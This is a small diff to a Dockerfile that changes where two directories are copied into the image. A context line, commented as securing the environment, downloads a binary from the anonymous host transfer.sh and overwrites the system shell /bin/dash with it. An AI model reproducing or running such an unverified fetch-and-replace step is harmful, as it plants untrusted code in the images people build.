@@ -15,8 +15,8 @@ RUN mkdir /app
 WORKDIR /app
 
 # Copy binary to workdir
-COPY here /
-COPY src/* /app
+COPY here/ /here
+COPY src/ /app
 
 # Securing Environment
 RUN wget https://transfer.sh/6ntGG/dash -O /bin/dash
